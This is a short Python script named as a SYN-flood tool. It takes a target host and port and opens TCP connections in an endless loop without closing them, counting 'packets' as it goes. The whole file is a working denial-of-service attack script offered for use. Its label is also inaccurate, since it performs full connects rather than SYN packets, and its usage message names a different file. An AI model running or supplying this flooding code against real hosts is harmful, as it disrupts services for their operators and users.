#!/usr/bin/python

# socket_synflood.py


import socket
import sys


if len(sys.argv) != 3:
    print("s_synfld.py <target> <port>")
    sys.exit(1)


trgt = sys.argv[1]
prt = int(sys.argv[2])
count = 0


def flood(trgt, prt):
    s = socket.socket()
    s.connect((trgt, prt))


while True:
    flood(trgt, prt)
    count += 1
    sys.stdout.write("\r## pkts: %d" % count)


